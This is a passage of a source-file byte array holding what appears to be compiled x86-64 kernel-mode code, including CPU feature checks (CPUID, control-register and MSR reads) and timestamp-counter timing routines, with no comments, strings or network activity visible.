    0xC3, 0x48, 0x8B, 0x41, 0x28, 0x48, 0x3B, 0xC2, 0x75, 0x17, 0x4C, 0x39, 0x41, 0x30, 0x75, 0x11,
    0x4C, 0x39, 0x49, 0x38, 0x75, 0x0B, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x48, 0x39, 0x41, 0x40, 0x74,
    0xDD, 0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x33, 0xC0, 0x48, 0x89, 0x41, 0x28, 0x48, 0x89, 0x41, 0x30, 0x48, 0x89, 0x41, 0x38, 0x48, 0x89,
    0x41, 0x40, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x5C, 0x24, 0x08, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8B, 0x41, 0x10, 0x48, 0x8B,
    0xDA, 0x48, 0x8B, 0xF9, 0x48, 0x85, 0xC0, 0x74, 0x15, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90,
    0x48, 0x39, 0x50, 0x08, 0x74, 0x38, 0x48, 0x8B, 0x00, 0x48, 0x85, 0xC0, 0x75, 0xF2, 0xB9, 0x18,
    0x00, 0x00, 0x00, 0xE8, 0x78, 0x51, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x16, 0xC7, 0x40, 0x10,
    0x01, 0x00, 0x00, 0x00, 0x48, 0x89, 0x58, 0x08, 0x48, 0x8B, 0x4F, 0x10, 0x48, 0x89, 0x08, 0x48,
    0x89, 0x47, 0x10, 0x48, 0x8B, 0x5C, 0x24, 0x30, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0x83, 0x40,
    0x10, 0x01, 0x48, 0x8B, 0x5C, 0x24, 0x30, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x5C, 0x24, 0x18, 0x55, 0x48, 0x83, 0xEC, 0x30, 0x48, 0x8B, 0x41, 0x48, 0x48, 0x89,
    0x7C, 0x24, 0x48, 0x48, 0x8B, 0xDA, 0x48, 0x3B, 0xC2, 0x48, 0x8B, 0xF9, 0x74, 0x25, 0x48, 0x8B,
    0x51, 0x48, 0x48, 0x8B, 0x02, 0x48, 0x3B, 0xC3, 0x74, 0x11, 0x66, 0x66, 0x90, 0x66, 0x66, 0x90,
    0x48, 0x8B, 0x12, 0x48, 0x8B, 0x02, 0x48, 0x3B, 0xC3, 0x75, 0xF5, 0x48, 0x8B, 0x03, 0x48, 0x89,
    0x02, 0xEB, 0x07, 0x48, 0x8B, 0x02, 0x48, 0x89, 0x41, 0x48, 0x48, 0x8B, 0x41, 0x28, 0x33, 0xED,
    0x48, 0x3B, 0x43, 0x08, 0x75, 0x10, 0x48, 0x89, 0x69, 0x28, 0x48, 0x89, 0x69, 0x30, 0x48, 0x89,
    0x69, 0x38, 0x48, 0x89, 0x69, 0x40, 0x48, 0x8B, 0x41, 0x08, 0x48, 0x85, 0xC0, 0x74, 0x7A, 0x48,
    0x8B, 0x09, 0x48, 0x89, 0x74, 0x24, 0x40, 0x48, 0x8D, 0x54, 0x24, 0x20, 0x8B, 0xF5, 0x48, 0x89,
    0x6C, 0x24, 0x20, 0x40, 0x88, 0x74, 0x24, 0x28, 0xE8, 0x73, 0x3A, 0x00, 0x00, 0x4C, 0x8B, 0x5F,
    0x08, 0x4D, 0x85, 0xDB, 0x74, 0x2A, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x90, 0x66, 0x66, 0x90,
    0x49, 0x8B, 0x4B, 0x10, 0x8B, 0x43, 0x20, 0x48, 0x2B, 0x4B, 0x08, 0x48, 0x3B, 0xC8, 0x73, 0x07,
    0x49, 0x89, 0x6B, 0x10, 0x83, 0xC6, 0x01, 0x4D, 0x8B, 0x5B, 0x08, 0x4D, 0x85, 0xDB, 0x75, 0xE0,
    0x48, 0x8B, 0x0F, 0x48, 0x8D, 0x54, 0x24, 0x20, 0xE8, 0x53, 0x3A, 0x00, 0x00, 0x85, 0xF6, 0x74,
    0x13, 0x48, 0x8D, 0x53, 0x3C, 0x48, 0x8D, 0x0D, 0xE4, 0x66, 0x00, 0x00, 0x44, 0x8B, 0xC6, 0xE8,
    0x84, 0x2B, 0x00, 0x00, 0x48, 0x8B, 0x74, 0x24, 0x40, 0x48, 0x8B, 0x43, 0x18, 0x48, 0x8B, 0x7C,
    0x24, 0x48, 0x48, 0x85, 0xC0, 0x74, 0x0B, 0x81, 0x7B, 0x34, 0x18, 0x82, 0x22, 0x00, 0x75, 0x02,
    0xFF, 0xD0, 0x89, 0x6B, 0x38, 0x48, 0x8B, 0xCB, 0xC7, 0x43, 0x34, 0x1C, 0x82, 0x22, 0x00, 0x48,
    0x89, 0x2B, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x30, 0x5D, 0xE9, 0xCF, 0x50, 0x00,
    0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x83, 0xEC, 0x18, 0x0F, 0x20, 0xC0, 0xB9, 0x01, 0x00, 0x00, 0x80, 0x48, 0x23, 0xC1, 0x48,
    0x3B, 0xC1, 0x74, 0x0B, 0x45, 0x33, 0xC0, 0x41, 0x8B, 0xC0, 0x48, 0x83, 0xC4, 0x18, 0xC3, 0x48,
    0x89, 0x7C, 0x24, 0x10, 0x41, 0x0F, 0x20, 0xE2, 0x45, 0x33, 0xC0, 0x41, 0xF6, 0xC2, 0x20, 0x41,
    0x8D, 0x78, 0x01, 0x45, 0x8B, 0xC8, 0x74, 0x57, 0x48, 0x89, 0x5C, 0x24, 0x20, 0xB8, 0x01, 0x00,
    0x00, 0x80, 0x0F, 0xA2, 0xF7, 0xC2, 0x00, 0x00, 0x10, 0x20, 0x89, 0x5C, 0x24, 0x04, 0x48, 0x8B,
    0x5C, 0x24, 0x20, 0x44, 0x8B, 0xDA, 0x89, 0x04, 0x24, 0x89, 0x4C, 0x24, 0x08, 0x74, 0x30, 0xB9,
    0x80, 0x00, 0x00, 0xC0, 0x0F, 0x32, 0x48, 0xC1, 0xE2, 0x20, 0x48, 0x0B, 0xC2, 0x41, 0x0F, 0xBA,
    0xE3, 0x14, 0x73, 0x09, 0x48, 0x0F, 0xBA, 0xE0, 0x0B, 0x44, 0x0F, 0x42, 0xCF, 0x41, 0x0F, 0xBA,
    0xE3, 0x1D, 0x73, 0x0B, 0x48, 0x0F, 0xBA, 0xE0, 0x0A, 0x73, 0x04, 0x41, 0x83, 0xC9, 0x02, 0x41,
    0x8A, 0xCA, 0x41, 0x8B, 0xC1, 0x81, 0xE1, 0xA0, 0x00, 0x00, 0x00, 0x48, 0x0B, 0xC8, 0x48, 0x81,
    0xF9, 0xA3, 0x00, 0x00, 0x00, 0x0F, 0x87, 0xB6, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x7E, 0xDA,
    0xFF, 0xFF, 0x0F, 0xB6, 0x84, 0x0A, 0x68, 0x26, 0x00, 0x00, 0x8B, 0x8C, 0x82, 0x40, 0x26, 0x00,
    0x00, 0x48, 0x03, 0xCA, 0xFF, 0xE1, 0x44, 0x8B, 0xC7, 0x48, 0x8B, 0x7C, 0x24, 0x10, 0x41, 0x8B,
    0xC0, 0x48, 0x83, 0xC4, 0x18, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x10, 0x41, 0xB8, 0x02, 0x00, 0x00,
    0x00, 0x41, 0x8B, 0xC0, 0x48, 0x83, 0xC4, 0x18, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x10, 0x41, 0xB8,
    0x03, 0x00, 0x00, 0x00, 0x41, 0x8B, 0xC0, 0x48, 0x83, 0xC4, 0x18, 0xC3, 0x48, 0x8B, 0x7C, 0x24,
    0x10, 0x41, 0xB8, 0x05, 0x00, 0x00, 0x00, 0x41, 0x8B, 0xC0, 0x48, 0x83, 0xC4, 0x18, 0xC3, 0x48,
    0x8B, 0x7C, 0x24, 0x10, 0x41, 0xB8, 0x04, 0x00, 0x00, 0x00, 0x41, 0x8B, 0xC0, 0x48, 0x83, 0xC4,
    0x18, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x10, 0x41, 0xB8, 0x07, 0x00, 0x00, 0x00, 0x41, 0x8B, 0xC0,
    0x48, 0x83, 0xC4, 0x18, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x10, 0x41, 0xB8, 0x09, 0x00, 0x00, 0x00,
    0x41, 0x8B, 0xC0, 0x48, 0x83, 0xC4, 0x18, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x10, 0x41, 0xB8, 0x08,
    0x00, 0x00, 0x00, 0x41, 0x8B, 0xC0, 0x48, 0x83, 0xC4, 0x18, 0xC3, 0x41, 0xB8, 0x0A, 0x00, 0x00,
    0x00, 0x48, 0x8B, 0x7C, 0x24, 0x10, 0x41, 0x8B, 0xC0, 0x48, 0x83, 0xC4, 0x18, 0xC3, 0x66, 0x90,
    0x96, 0x25, 0x00, 0x00, 0xB9, 0x25, 0x00, 0x00, 0xCC, 0x25, 0x00, 0x00, 0xF2, 0x25, 0x00, 0x00,
    0x05, 0x26, 0x00, 0x00, 0xA6, 0x25, 0x00, 0x00, 0xDF, 0x25, 0x00, 0x00, 0x18, 0x26, 0x00, 0x00,
    0x2B, 0x26, 0x00, 0x00, 0x31, 0x26, 0x00, 0x00, 0x00, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09,
    0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09,
    0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x01, 0x02, 0x03, 0x04, 0x09, 0x09, 0x09, 0x09,
    0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09,
    0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09,
    0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09,
    0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09,
    0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09,
    0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x05, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09,
    0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09,
    0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x09, 0x06, 0x06, 0x07, 0x08, 0xCC, 0xCC, 0xCC, 0xCC,
    0x40, 0x53, 0x48, 0x83, 0xEC, 0x30, 0x48, 0x8B, 0xD9, 0xE8, 0x72, 0xE0, 0xFF, 0xFF, 0x83, 0xF8,
    0x01, 0x76, 0x75, 0x48, 0x8B, 0xCB, 0xE8, 0x95, 0xE0, 0xFF, 0xFF, 0x84, 0xC0, 0x74, 0x0B, 0xB8,
    0x02, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x30, 0x5B, 0xC3, 0x33, 0xC0, 0x0F, 0xA2, 0x83, 0xF8,
    0x01, 0x72, 0x55, 0x81, 0xFB, 0x41, 0x75, 0x74, 0x68, 0x75, 0x4D, 0x81, 0xF9, 0x63, 0x41, 0x4D,
    0x44, 0x75, 0x45, 0x81, 0xFA, 0x65, 0x6E, 0x74, 0x69, 0x75, 0x3D, 0xB8, 0x00, 0x00, 0x00, 0x80,
    0x0F, 0xA2, 0x3D, 0x07, 0x00, 0x00, 0x80, 0x89, 0x5C, 0x24, 0x24, 0x89, 0x4C, 0x24, 0x28, 0x89,
    0x54, 0x24, 0x2C, 0x72, 0x23, 0xB8, 0x07, 0x00, 0x00, 0x80, 0x0F, 0xA2, 0x0F, 0xBA, 0xE2, 0x08,
    0x89, 0x44, 0x24, 0x20, 0x89, 0x5C, 0x24, 0x24, 0x89, 0x4C, 0x24, 0x28, 0x72, 0x0A, 0xF6, 0xC2,
    0x3E, 0xB8, 0x02, 0x00, 0x00, 0x00, 0x75, 0x05, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4,
    0x30, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x33, 0xD2, 0x48, 0x81, 0xC1, 0x10, 0x01, 0x00, 0x00, 0x89, 0x91, 0xF0, 0xFE, 0xFF, 0xFF, 0x8D,
    0x42, 0x20, 0x48, 0x89, 0x51, 0xF8, 0x48, 0x89, 0x11, 0x89, 0x51, 0x14, 0x48, 0x83, 0xC1, 0x60,
    0x48, 0x83, 0xE8, 0x01, 0x75, 0xEC, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x4C, 0x87, 0x42, 0x08, 0x4C, 0x8B, 0xCA, 0x4C, 0x8B, 0xD1, 0x0F, 0x31, 0x4D, 0x8B, 0x41, 0x10,
    0x48, 0xC1, 0xE2, 0x20, 0x48, 0x0B, 0xC2, 0x48, 0x8B, 0xD0, 0x49, 0x87, 0x41, 0x10, 0x48, 0xB8,
    0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0x49, 0x2B, 0xD0, 0x48, 0x85, 0xD0, 0x74, 0x09,
    0x41, 0x8B, 0x51, 0x04, 0x41, 0x83, 0x41, 0x20, 0x01, 0x45, 0x8B, 0x41, 0x24, 0x41, 0x83, 0xC0,
    0x01, 0x41, 0x83, 0xE0, 0x07, 0x41, 0x8B, 0xC0, 0x41, 0x87, 0x41, 0x24, 0x8B, 0xC2, 0x43, 0x87,
    0x44, 0x81, 0x28, 0x8B, 0x41, 0x10, 0x3D, 0xE8, 0x03, 0x00, 0x00, 0x72, 0x44, 0x41, 0x8B, 0x49,
    0x28, 0x41, 0x8B, 0x41, 0x2C, 0x03, 0xC8, 0x41, 0x8B, 0x41, 0x30, 0x03, 0xC8, 0x41, 0x8B, 0x41,
    0x34, 0x45, 0x8B, 0x41, 0x38, 0x03, 0xC8, 0x41, 0x8B, 0x41, 0x3C, 0x44, 0x03, 0xC0, 0x41, 0x8B,
    0x41, 0x40, 0xC1, 0xE9, 0x02, 0x44, 0x03, 0xC0, 0x41, 0x8B, 0x41, 0x44, 0x44, 0x03, 0xC0, 0x41,
    0xC1, 0xE8, 0x02, 0x44, 0x03, 0xC1, 0x41, 0xD1, 0xE8, 0x41, 0x8B, 0xD0, 0xC1, 0xEA, 0x0E, 0xEB,
    0x28, 0x8B, 0x41, 0x10, 0x83, 0xF8, 0x5A, 0x72, 0x1A, 0x41, 0x8D, 0x40, 0xFF, 0x83, 0xE0, 0x07,
    0x45, 0x8B, 0x44, 0x81, 0x28, 0x44, 0x03, 0xC2, 0x41, 0xD1, 0xE8, 0x41, 0x8B, 0xD0, 0xC1, 0xEA,
    0x07, 0xEB, 0x06, 0x44, 0x8B, 0xC2, 0xC1, 0xEA, 0x06, 0x42, 0x8D, 0x04, 0x02, 0x41, 0x87, 0x41,
    0x04, 0x41, 0x8B, 0x4A, 0x10, 0x41, 0x8B, 0xC0, 0x48, 0x0F, 0xAF, 0xC8, 0x49, 0x87, 0x49, 0x18,
    0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x40, 0x53, 0x48, 0x83, 0xEC, 0x30, 0x83, 0x79, 0x08, 0x02, 0x4C, 0x8B, 0xD2, 0x4C, 0x8B, 0xC9,
    0x41, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x74, 0x09, 0x48, 0x8D, 0x99, 0x00, 0x01, 0x00, 0x00, 0xEB,
    0x37, 0x41, 0x8B, 0xC0, 0x0F, 0xA2, 0x89, 0x44, 0x24, 0x20, 0x8B, 0xC3, 0x89, 0x4C, 0x24, 0x28,
    0x48, 0xC1, 0xE8, 0x18, 0x89, 0x5C, 0x24, 0x24, 0x89, 0x54, 0x24, 0x2C, 0x0F, 0xB6, 0xC8, 0x83,
    0xF9, 0x20, 0x0F, 0x83, 0x93, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x0C, 0x49, 0x48, 0xC1, 0xE1, 0x05,
    0x4A, 0x8D, 0x9C, 0x09, 0x00, 0x01, 0x00, 0x00, 0xF0, 0x44, 0x0F, 0xC1, 0x03, 0x41, 0x83, 0xC0,
    0x01, 0x41, 0xF6, 0xC0, 0x01, 0x75, 0x0E, 0xF0, 0x83, 0x03, 0x01, 0x83, 0x43, 0x20, 0x01, 0x48,
    0x83, 0xC4, 0x30, 0x5B, 0xC3, 0x8B, 0x03, 0xA9, 0xFE, 0x0F, 0x00, 0x00, 0x75, 0x4B, 0x49, 0x8B,
    0x41, 0x18, 0x48, 0x85, 0xC0, 0x74, 0x3B, 0x49, 0x8B, 0x41, 0x18, 0x33, 0xD2, 0x49, 0x8B, 0xCA,
    0x48, 0x2B, 0xC8, 0x48, 0xB8, 0x00, 0x00, 0x50, 0xD6, 0xDC, 0x01, 0x00, 0x00, 0x48, 0xF7, 0xF1,
    0x4C, 0x8B, 0xC0, 0x8D, 0x48, 0xE2, 0x81, 0xF9, 0xB2, 0x07, 0x00, 0x00, 0x77, 0x14, 0x8B, 0xC8,
    0x33, 0xD2, 0xB8, 0x00, 0xCA, 0x9A, 0x3B, 0x41, 0x87, 0x49, 0x10, 0x41, 0xF7, 0xF0, 0x41, 0x87,
    0x41, 0x14, 0x49, 0x8B, 0xC2, 0x49, 0x87, 0x41, 0x18, 0x4D, 0x8B, 0xC2, 0x48, 0x8B, 0xD3, 0x49,
    0x8B, 0xC9, 0xE8, 0x39, 0xFE, 0xFF, 0xFF, 0xF0, 0x83, 0x03, 0x01, 0x48, 0x83, 0xC4, 0x30, 0x5B,
    0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x83, 0xEC, 0x28, 0x41, 0x83, 0xF8, 0x20, 0x73, 0x43, 0x41, 0x8B, 0xC0, 0x4C, 0x8D, 0x04,
    0x40, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x49, 0xC1, 0xE0, 0x05, 0x4D, 0x8D, 0x9C, 0x08, 0x00, 0x01,
    0x00, 0x00, 0xF0, 0x41, 0x0F, 0xC1, 0x03, 0x83, 0xC0, 0x01, 0xA8, 0x01, 0x75, 0x0F, 0xF0, 0x41,
    0x83, 0x03, 0x01, 0x41, 0x83, 0x43, 0x20, 0x01, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0x4C, 0x8B, 0xC2,
    0x49, 0x8B, 0xD3, 0xE8, 0xD8, 0xFD, 0xFF, 0xFF, 0xF0, 0x41, 0x83, 0x03, 0x01, 0x48, 0x83, 0xC4,
    0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x4C, 0x8B, 0xC2, 0x0F, 0x31, 0x48, 0xC1, 0xE2, 0x20, 0x48, 0x0B, 0xC2, 0x49, 0x89, 0x00, 0xC3,
    0x40, 0x55, 0x41, 0x55, 0x41, 0x57, 0x48, 0x83, 0xEC, 0x30, 0x4C, 0x8B, 0xE9, 0x41, 0xBF, 0x01,
    0x00, 0x00, 0x00, 0x4C, 0x89, 0x39, 0x48, 0x8D, 0x4C, 0x24, 0x50, 0xE8, 0x90, 0x2B, 0x00, 0x00,
    0x48, 0x8B, 0x54, 0x24, 0x50, 0x33, 0xED, 0xB8, 0x40, 0x00, 0x00, 0x00, 0x66, 0x66, 0x66, 0x90,
    0x49, 0x2B, 0xC7, 0x48, 0x0F, 0xA3, 0xC2, 0x73, 0x04, 0x48, 0x83, 0xC5, 0x01, 0x48, 0x85, 0xC0,
    0x75, 0xEE, 0x83, 0xFD, 0x02, 0x7D, 0x0A, 0x48, 0x83, 0xC4, 0x30, 0x41, 0x5F, 0x41, 0x5D, 0x5D,
    0xC3, 0x48, 0x89, 0x5C, 0x24, 0x58, 0x48, 0x89, 0x74, 0x24, 0x60, 0x48, 0x89, 0x7C, 0x24, 0x68,
    0x4C, 0x89, 0x64, 0x24, 0x28, 0x4C, 0x89, 0x74, 0x24, 0x20, 0x4C, 0x8D, 0x35, 0x5F, 0x95, 0x00,
    0x00, 0x45, 0x33, 0xE4, 0x33, 0xFF, 0x33, 0xF6, 0x85, 0xED, 0x7E, 0x66, 0x66, 0x66, 0x66, 0x90,
    0x48, 0x8B, 0xCF, 0xE8, 0x98, 0x2A, 0x00, 0x00, 0x85, 0xC0, 0x0F, 0x88, 0xBE, 0x00, 0x00, 0x00,
    0x8B, 0xC8, 0x48, 0x8B, 0x44, 0x24, 0x50, 0x48, 0x0F, 0xA3, 0xC8, 0x0F, 0x92, 0xC0, 0x84, 0xC0,
    0x0F, 0x84, 0xA8, 0x00, 0x00, 0x00, 0x48, 0x63, 0xC6, 0x49, 0x63, 0xCC, 0x48, 0xC1, 0xE1, 0x06,
    0x48, 0x03, 0xC8, 0x49, 0x8D, 0x1C, 0xCE, 0x8B, 0xCF, 0xE8, 0x72, 0x2A, 0x00, 0x00, 0x48, 0x8D,
    0x15, 0x2B, 0xFF, 0xFF, 0xFF, 0x45, 0x33, 0xC9, 0x48, 0x8B, 0xC8, 0x4C, 0x8B, 0xC3, 0xE8, 0x6D,
    0x30, 0x00, 0x00, 0x83, 0xF8, 0xDB, 0x74, 0x7E, 0x41, 0x03, 0xF7, 0x49, 0x03, 0xFF, 0x3B, 0xF5,
    0x7C, 0x9E, 0x45, 0x03, 0xE7, 0x41, 0x83, 0xFC, 0x08, 0x72, 0x89, 0x48, 0x83, 0xCB, 0xFF, 0x45,
    0x32, 0xD2, 0x48, 0x63, 0xED, 0x33, 0xFF, 0x48, 0x8D, 0x35, 0xDA, 0x94, 0x00, 0x00, 0x44, 0x8D,
    0x63, 0x09, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90,
    0x4C, 0x8B, 0x46, 0xF8, 0x33, 0xD2, 0x45, 0x0F, 0xB6, 0xD2, 0x4C, 0x3B, 0xC7, 0x49, 0x8B, 0xF8,
    0x45, 0x0F, 0x46, 0xD7, 0x49, 0x3B, 0xEF, 0x7E, 0x4A, 0x4C, 0x8B, 0xCE, 0x4C, 0x8D, 0x5D, 0xFF,
    0x49, 0x8B, 0x09, 0x41, 0x0F, 0xB6, 0xC2, 0x48, 0x3B, 0xCF, 0x48, 0x8B, 0xF9, 0x41, 0x0F, 0x46,
    0xC7, 0x49, 0x3B, 0xC8, 0x44, 0x8A, 0xD0, 0x76, 0x11, 0x49, 0x2B, 0xC8, 0xEB, 0x15, 0x49, 0x03,
    0xFF, 0xE9, 0x2A, 0xFF, 0xFF, 0xFF, 0x32, 0xC0, 0xEB, 0x33, 0x49, 0x8B, 0xC0, 0x48, 0x2B, 0xC1,
    0x48, 0x8B, 0xC8, 0x48, 0x3B, 0xD1, 0x48, 0x0F, 0x42, 0xD1, 0x49, 0x83, 0xC1, 0x08, 0x4D, 0x2B,
    0xDF, 0x75, 0xBD, 0x48, 0x3B, 0xDA, 0x48, 0x0F, 0x47, 0xDA, 0x48, 0x81, 0xC6, 0x00, 0x02, 0x00,
    0x00, 0x4D, 0x2B, 0xE7, 0x75, 0x8A, 0x49, 0x89, 0x5D, 0x00, 0x41, 0x8A, 0xC2, 0x4C, 0x8B, 0x64,
    0x24, 0x28, 0x48, 0x8B, 0x7C, 0x24, 0x68, 0x48, 0x8B, 0x74, 0x24, 0x60, 0x48, 0x8B, 0x5C, 0x24,
    0x58, 0x4C, 0x8B, 0x74, 0x24, 0x20, 0x48, 0x83, 0xC4, 0x30, 0x41, 0x5F, 0x41, 0x5D, 0x5D, 0xC3,
    0x33, 0xC0, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x33, 0xC0, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x33, 0xC0, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x4C, 0x89, 0x4C, 0x24, 0x20, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0xC2, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0xC2, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x54, 0x24, 0x10, 0x4C, 0x89, 0x44, 0x24, 0x18, 0x4C, 0x89, 0x4C, 0x24, 0x20, 0xC3,
    0xC2, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x4C, 0x8B, 0xDC, 0x49, 0x89, 0x5B, 0x20, 0x57, 0x41, 0x55, 0x41, 0x56, 0x48, 0x83, 0xEC, 0x40,
    0x48, 0x8B, 0x42, 0x20, 0x49, 0x89, 0x6B, 0x08, 0x49, 0x89, 0x73, 0x10, 0x45, 0x33, 0xF6, 0x48,
    0x85, 0xC0, 0x4D, 0x89, 0x63, 0x18, 0x4C, 0x8B, 0xEA, 0x48, 0x8B, 0xF1, 0x0F, 0x84, 0xF5, 0x00,
    0x00, 0x00, 0x48, 0x8B, 0x09, 0x49, 0x8D, 0x53, 0xC8, 0x4D, 0x89, 0x73, 0xC8, 0x45, 0x88, 0x73,
    0xD0, 0xE8, 0xFA, 0x31, 0x00, 0x00, 0x49, 0x8B, 0x7D, 0x20, 0x48, 0x85, 0xFF, 0x0F, 0x84, 0xC7,
    0x00, 0x00, 0x00, 0x90, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90,
    0x48, 0x8B, 0x07, 0x48, 0x8B, 0x5F, 0x08, 0x49, 0x89, 0x45, 0x20, 0x8B, 0x4B, 0x28, 0x8B, 0x47,
    0x10, 0x3B, 0xC1, 0x73, 0x1A, 0x8B, 0x4B, 0x28, 0x8B, 0x47, 0x10, 0x48, 0x8D, 0x54, 0x24, 0x20,
    0x2B, 0xC8, 0x89, 0x4B, 0x28, 0x48, 0x8B, 0x0E, 0xE8, 0xD3, 0x31, 0x00, 0x00, 0xEB, 0x69, 0x48,
    0x8B, 0x46, 0x08, 0x48, 0x3B, 0xC3, 0x75, 0x0A, 0x48, 0x8B, 0x43, 0x08, 0x48, 0x89, 0x46, 0x08,
    0xEB, 0x2A, 0x48, 0x8B, 0x4E, 0x08, 0x48, 0x85, 0xC9, 0x74, 0x21, 0x66, 0x90, 0x66, 0x66, 0x90,
    0x48, 0x8B, 0x41, 0x08, 0x48, 0x3B, 0xC3, 0x74, 0x0B, 0x48, 0x8B, 0x49, 0x08, 0x48, 0x85, 0xC9,
    0x75, 0xEE, 0xEB, 0x08, 0x48, 0x8B, 0x43, 0x08, 0x48, 0x89, 0x41, 0x08, 0x48, 0x8B, 0x0E, 0x48,
    0x8D, 0x54, 0x24, 0x20, 0xE8, 0x87, 0x31, 0x00, 0x00, 0x4C, 0x8B, 0x5B, 0x10, 0x4D, 0x85, 0xDB,
    0x74, 0x0E, 0x4C, 0x8B, 0x43, 0x20, 0x48, 0x8B, 0x53, 0x18, 0x48, 0x8B, 0xCB, 0x41, 0xFF, 0xD3,
    0x48, 0x8B, 0xCB, 0xE8, 0xE8, 0x47, 0x00, 0x00, 0x48, 0x8B, 0xCF, 0xE8, 0xE0, 0x47, 0x00, 0x00,
    0x48, 0x8B, 0x0E, 0x48, 0x8D, 0x54, 0x24, 0x20, 0xE8, 0x33, 0x31, 0x00, 0x00, 0x49, 0x8B, 0x7D,
    0x20, 0x48, 0x85, 0xFF, 0x0F, 0x85, 0x46, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x0E, 0x48, 0x8D, 0x54,
    0x24, 0x20, 0xE8, 0x39, 0x31, 0x00, 0x00, 0x4D, 0x8D, 0x65, 0x40, 0x4D, 0x85, 0xE4, 0x49, 0x8B,
